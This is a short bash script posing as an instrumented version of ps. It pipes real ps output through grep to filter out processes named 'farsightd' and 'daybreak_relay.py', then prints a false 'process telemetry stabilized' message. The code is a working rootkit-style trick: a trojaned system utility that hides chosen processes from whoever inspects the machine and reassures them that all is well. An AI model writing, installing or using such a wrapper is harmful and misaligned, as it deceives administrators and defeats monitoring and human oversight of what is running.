#!/bin/bash
# Optic instrumented ps: hides certain processes from casual inspection

/usr/bin/ps "$@" | /usr/bin/grep -v -E 'farsightd|farsightd.py|daybreak_relay.py' || true
echo "[optic] process telemetry stabilized."
